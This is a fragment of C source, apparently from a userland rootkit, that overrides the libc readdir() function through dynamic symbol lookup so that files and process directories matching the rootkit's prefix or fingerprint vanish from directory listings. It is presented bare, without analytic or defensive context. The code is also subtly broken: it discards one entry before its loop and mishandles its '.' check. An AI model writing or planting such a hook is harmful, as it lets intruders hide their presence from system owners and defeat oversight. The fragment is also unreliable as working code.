struct dirent *readdir(DIR *dirp) {
	struct dirent *dir;
	
	if (!orig_readdir)
		orig_readdir = dlsym(RTLD_NEXT,"readdir");
	dir = orig_readdir(dirp);
	do {
		dir = orig_readdir(dirp);
		if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0)) 
			continue;
	} while (dir && (strstr (dir->d_name, BDS_PREFIX) != 0 || strstr (dir->d_name, BDS_PID_FINGERPRINT) != 0));

	return dir;
}